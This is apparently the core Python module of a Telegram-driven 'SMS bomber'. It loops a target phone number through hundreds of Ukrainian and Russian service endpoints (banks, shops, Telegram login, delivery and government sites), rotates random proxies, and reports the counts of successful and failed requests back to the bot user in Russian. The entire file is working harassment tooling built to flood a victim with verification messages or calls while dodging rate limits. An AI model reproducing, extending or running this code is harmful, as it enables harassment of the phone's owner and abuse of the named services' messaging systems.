from ua_services import *
from ru_services import *
import os, time, random, asyncio, traceback

class Bomber:
    
    def __init__(self):
        self.servicesList = [['authmultiplexua', 'biua', 'riderukloncomua', 'ucbzapteka24ua', 'ancua', 'kazandivaneateryclub', 'apitelemedcare', 'myctrscomua', 'pwaapievaua', 'kaktusua', 'podushkacomua', 'kuzua', 'varusua', 'ultrashopcom', 'avroraua', 'mamakupiua', '_001comua', 'teaua', 'samsoniteua', 'odrextop', 'mylunua', 'megasportua', 'wwwpratikcomua', 'welovemebelcomua', 'apisezamfoodcomua', 'apidevcoloritua', 'helsime', 'ehrh24ua', 'taxibondkievua', 'automotoua', 'apiovoua', 'ucblpodorozhnykcom', 'zernoagrotendercomua', 'wwwgarryscomua', 'iqpizzaeateryclub', 'vandalvapecomua', 'smakimakicom', 'maslotomcom', 'loyaltyvidiua', 'apistaffclothescom', 'vilkipalkiodua', 'vchehleua', 'apistarylevcomua', 'angiocomua', 'goodtoyscomua', 'sushiyaua', 'carsua', 'shopkyivstarua', 'mytelegramorg', 'registrationvodafoneua', 'prontopizzaua', 'apisweettv', 'wwwiqoscomua', 'c2coschadbankua', 'abankcomua', 'bshoppingua', 'sferaua', 'autheasypayua', 'oauthtelegramorg', 'oauthtelegramorg2', 'apisweettv2', 'mapizzacomua', 'trebapizza', 'ilmolinoua', 'pizza33ua', 'sushi33ua', 'sushigocomua', 'liki24com', 'wwwfoxtrotcomua', 'estroua', 'pldeyewearcomua', 'opticaluxorua', 'apivbavtocomua', 'maritelcomua', 'galafarmcomua', 'suitecrmmorionua', 'zrinua', 'kuzua2', 'zolotoyvekua', 'marigoinua', 'loveyoujewelscom', 'cinemacitiua', 'wwwtarantinofamilycom', 'uicqnet', 'wwwgarryscomua2', 'wwwgarryscomua2', 'apilikariinua', 'brandcentrcom', 'dokua', 'pizzaodua', 'bondodua', 'pcshopua', 'agrotendercomua', 'agromarketnet', 'userliveboltsvcnet', 'apicreditkasaua', 'sushikoshiksumyua', 'apirielua', 'smarttvvoliacom', 'smarttvvoliacom2', 'tenettv', 'creditplusua', 'eazycashcomua', 'finxcomua', 'findcloneru', 'clientsproductionvidmindcom', 'utaxeu1utaxcloudnet', 'medicsua', 'hostelikaricomua', 'monihealcom', 'barbercompanycom', 'uaauthkentkartcom', 'busforua', 'bookssecondlifecomua', 'sotabuhcomua', 'cnesvitlocomua', 'cnesvitlocomua2', 'apiprostonet', 'barsgroupcomua', 'ooekodua', 'okdtekdnemcomua', 'okdtekdnemcomua2', 'novatorstroycom', 'mycashalotorgua', 'mycashalotorgua2', 'myintosanaua', 'apirudatingclubcom', 'apirudatingclubcom2', 'ussrozetkacomua', 'mnplifecellua', 'yaroua', 'yaroua2', 'sushiiconscomua', 'bebudusushiua', 'wwwliqpayua', 'sushiwokua', 'rnrcomua', 'myyasnocomua', 'myyasnocomua2', 'optiglobal', 'autosystemscomua', 'vinkodcomua', 'greengaragecomua', 'backepandoraua', 'gkzpcomua', 'zoocomplexcomua', 'shopagromatua', 'shopagromatua2', 'venetoua', 'owwacomua', 'maketattoocomua', 'jurknigaua', 'accountsfactorua', 'apitadanetua', 'gipfelua', 'wwwmoyoua', 'polisua', 'polisua2', 'brocarshop', 'atlua', 'totopizzaeateryclub', 'kabanchikua', 'wwwprivat24ua', 'ufacvetovru', 'ufacvetovru2', 'idnovaposhtaua', 'idnovaposhtaua2', 'yokiua', 'biua2', 'carsuanet', 'wwwintimocomua', 'sexshopua', 'samsungshopcomua', 'samsungshopcomua2', 'sushipovarua', 'apigotindercom', 'yaposhkacomua', 'alloua', 'laua', 'money4youua'], ['api455seonityru', 'dobrotsenru', 'xnh1aarkbk5aexnp1ai', '_05ru', 'mybcinformru', 'demoapimobilebristolru', 'spbstartexru', 'pitcoferu', 'xn56plcifg2alx8fxnp1ai', 'gosapteka18ru', 'lemurrrru', 'wwwkuchenlandru', 'ufakhesflowersru', 'alcomarketru', 'pizzasangoulashtech', 'vladivostoklovikuponru', 'apifixpricecom', '_2598787ru', 'sendflowersru', 'gsmstoreru', 'agrosemfondru', 'lapizzapro', 'sushifujiru', 'tankandhopperru', 'profimagcom', 'starfood73ru', 'crmjustfoodpro', 'adminkalinamalinaru', 'sberpravoru', 'xne1agpbetwxnp1ai', 'sushiaziaru', 'cp2gkventureru', 'dostavkadixyru', 'apisberautocom', 'columbiaru', 'pizzasushiwokru', 'dobropizzaru', 'wwwsportmasterru', 'peakstoreru', 'pizzatorest', 'domadomru', 'ostincom', '_1811storescom', 'dlvryru', 'wwwvelocitykru', 'freeway74ru', 'lkregionzolotoru', 'furskru', 'planetazdorovoru', 'authnmarketpro', 'domarketru', 'apiloverepublicru', 'api4slovoru', 'wwwbigamru', 'aleksandrovmypizza1ru', 'wwwdemixru', 'wwwtechportru', 'apisushistereoru', 'shpiviru', 'wwwcdekru', 'grasssu', 'xn8sbldxm1a2gxnp1ai', 'studyonlineschool1ru', 'sibirkolesoru', 'apigrill1org', 'yuzhanedostavkaru', 'wwwpabepperu', 'tihiysushiru', 'wwwncsemenaru', 'opticcenterru', 'dbnsushifridayru', 'klassikaaptekaru', 'samizooru', 'roliksushiru', 'dostavochkaru', 'shophlebpromru', 'letiqueru', 'wwwpuhovikru', 'batuttocom', 'cntm7itv02svciptvrtru', 'santehnikaonlineru', 'servicesopenru', 'mybilesecretkitchenru', 'wwwparfumliderru', 'hoffru', 'anketarencreditru', 'wwwkristallshopru', 'apisushcofru', 'sushisellgoulashtech', 'bigroll66ru', 'sushifujiru2', 'xn8sbwgpzjf9bxnp1ai', 'apisushifoxru', 'kvikuru', 'wwwpetshopru', 'dostavkaalendvicru', 'pervieru', 'apistarterappru', 'apirichfamilyru', 'podkrepizzaru', 'azbukaseveraru', 'spbshinserviceru', 'mirkubikovru', 'aptekaotskladaru', 'aostngru', 'liniilubviru', 'wwwsibgoldru', 'shopkrastsvetmetru', 'kanzlerstyleru', 'wwwushatavacom', 'drivewbru', 'spointwbru', 'extcourierwbru', 'consultationsappwildberriesru', 'vmestewildberriesru', 'apidigitalwildberriesru', 'authorrwildberriesru', 'wbjobsappwildberriesru', 'sellerwildberriesru', 'executorsvsemrabotaru', 'marketevotorru', 'registratormobileyandexnet', 'regedayandexru', 'idpgazprombankinvestments', 'translationstelegramorg', 'promotetelegramorg', 'oauthtelegramorg', 'oauthtelegramorg2', 'infoapierru', 'ekonikaru', 'expresspandaru', 'sushistoreru', 'lentacom', 'cmscivimartru', 'lkmysbertipsru', 'ixoraautoru', 'simferopolfitautoru', 'okru', 'remru', 'markovdvorru', 'knopkadengiru', 'sberlegalru', 'sberuslugiru', 'carmoneyru', 'fotostranaru', 'wwwleturu', 'cvetok39ru', 'gotosportru', 'customertenapiyumaposru', 'cheboksarirvkusacom', 'mybilericersru', 'bikecentreru', 'agromarket24ru', 'aptstoreru', 'apikazanexpressru', 'mytelegramorg', 'fundayshopcom', 'www4x4ruru', 'apirichfamilyru2', 'ryvokru', '_05ru2', 'vn1ru', 'authmosmetroru', 'hoffru2', 'oauthavru', 'ssomtsbankru', 'yappymedia', 'wwwakbarsru', 'tvoeru', 'apisunlightnet', 'wwwtinkoffru', 'svoefermerstvoru', 'wwwgosuslugiru', 'uicqnet', 'optlovemarketnet', 'siteapibetboomru', 'ibpsbankru', 'uviru', 'evrotekspbru', 'lavandaflorru', 'apigotindercom', 'advaorgru', 'wwwvodovozspbru', 'onlinevtbru', 'siteapivkusnoitochkaru', 'lovepirogovaru', 'wwwxfitru', 'milydomru', 'spacesushimoscow', 'moscowwasabiru', 'upsushigoulashtech', 'xn8sbpjmk6aq9bxnp1ai', 'apistarterappru2', 'mskhotkitchendeliveryru', 'apinorvikbankru', 'pikaburu', 'premierone', 'onlinesberbankru', 'stockmannru', 'ekapustacom', 'wwwkuchenlandru2', 'delofonru', 'lksvobodazaimru', 'myworldclassru', 'apirudatingclubcom', 'avtosetsu', 'clientsapi31wbk6bbaresourcescom', 'apikingtodayru', 'api1imshopio', 'ekonikaru2', 'lkmymiratorgru', 'menuformeonline', 'lknpdnalogru', 'wwwrendezvousru', 'accountsmotrimru', 'extservicetricolortv', 'gosapteka18ru2', 'starboxsu', 'lapizzapro2', 'api4slovoru2', 'xn8sbldxm1a2gxnp1ai2', 'roliksushiru2', 'anketarencreditru2', 'apisushistereoru2', 'kvikuru2', 'wwwleturu2', 'sushistoreru2', 'shopkrastsvetmetru2', 'marketevotorru2', 'wwwpetshopru2', 'bigroll66ru2', 'pizzasushiwokru2']]
        self.proxyFile = 'proxy.txt'
        self.proxyList = []
        self.good = 0 
        self.bad = 0
        self.all = 0
    
    def loadProxies(self, country):
        with open(f'{country}_{self.proxyFile}', 'r', encoding = 'utf-8') as f:
            self.proxyList = f.read().strip().splitlines()

    def randProxy(self):
        if self.proxyFile == '' or len(self.proxyList) == 0:
            return None

        rand_proxy = random.choice(self.proxyList)

        return 'http://' + rand_proxy

    def loadServices(self):
        files = os.listdir('ua_services')
        for x in files:
            if x in ('__pycache__', '__init__.py', 'miyscript.py'):
                continue
            self.servicesList[0].append(x.replace('.py', ''))

        files = os.listdir('ru_services')
        for x in files:
            if x in ('__pycache__', '__init__.py', 'miyscript.py'):
                continue
            self.servicesList[1].append(x.replace('.py', ''))

    async def attackUA(self, bot, BID, Bombs):
        bomb = Bombs.get_bomb(BID)
        _phone = bomb.NUM
        UID = bomb.UID
        iterations = bomb.ITR
        if iterations != bomb.GITR and bomb.GITR != 0:
            iterations = bomb.GITR
        elif iterations == bomb.GITR:
            await bot.send_message(UID, f'''<b>✝️ Бомбер остановлен! #{BID}

🔮 Успешных запросов:</b> <code>{self.good}</code>
<b>❌ Неуспешных запросов:</b> <code>{self.bad}</code>''')
            Bombs.get_bomb(BID).delete_instance_instance()
            return

        for x in range(iterations):
            for service in self.servicesList[0]:
                self.all += 1
                
                proxy = self.randProxy()
                try:
                    await eval(service + '.run(_phone, proxy)')
                    self.good += 1
                except Exception as e:
                    traceback.print_exc()
                    print(f'[#{BID} UA] [-] {service} {proxy} {e}')
                    self.bad += 1

                await asyncio.sleep(0.5)
                if not Bombs.bomb_alive(BID):
                    await bot.send_message(UID, f'''<b>✝️ Бомбер остановлен! #{BID}

🔮 Успешных запросов:</b> <code>{self.good}</code>
<b>❌ Неуспешных запросов:</b> <code>{self.bad}</code>''')
                    Bombs.get_bomb(BID).delete_instance()
                    return

        await bot.send_message(UID, f'''<b>✝️ Бомбер закончен! #{BID}

🔮 Успешных запросов:</b> <code>{self.good}</code>
<b>❌ Неуспешных запросов:</b> <code>{self.bad}</code>''')
        Bombs.get_bomb(BID).delete_instance()
        return
    
    async def runUA(self, bot, BID, Bombs):
        self.loadProxies('ua')
        await self.attackUA(bot, BID, Bombs)

    async def attackRU(self, bot, BID, Bombs):
        bomb = Bombs.get_bomb(BID)
        _phone = bomb.NUM
        UID = bomb.UID
        iterations = bomb.ITR
        if iterations != bomb.GITR and bomb.GITR != 0:
            iterations = bomb.GITR
        elif iterations == bomb.GITR:
            await bot.send_message(UID, f'''<b>✝️ Бомбер остановлен! #{BID}

🔮 Успешных запросов:</b> <code>{self.good}</code>
<b>❌ Неуспешных запросов:</b> <code>{self.bad}</code>''')
            Bombs.get_bomb(BID).delete_instance()
            return

        for x in range(iterations):
            for service in self.servicesList[1]:
                self.all += 1
                
                proxy = self.randProxy()
                try:
                    await eval(service + '.run(_phone, proxy)')
                    self.good += 1
                except Exception as e:
                    traceback.print_exc()
                    print(f'[#{BID} RU] [-] {service} {proxy} {e}')
                    self.bad += 1

                await asyncio.sleep(0.5)
                if not Bombs.bomb_alive(BID):
                    await bot.send_message(UID, f'''<b>✝️ Бомбер остановлен! #{BID}

🔮 Успешных запросов:</b> <code>{self.good}</code>
<b>❌ Неуспешных запросов:</b> <code>{self.bad}</code>''')
                    Bombs.get_bomb(BID).delete_instance()
                    return

        await bot.send_message(UID, f'''<b>✝️ Бомбер закончен! #{BID}

🔮 Успешных запросов:</b> <code>{self.good}</code>
<b>❌ Неуспешных запросов:</b> <code>{self.bad}</code>''')
        Bombs.get_bomb(BID).delete_instance()
        return
    
    async def runRU(self, bot, BID, Bombs):
        self.loadProxies('ru')
        await self.attackRU(bot, BID, Bombs)
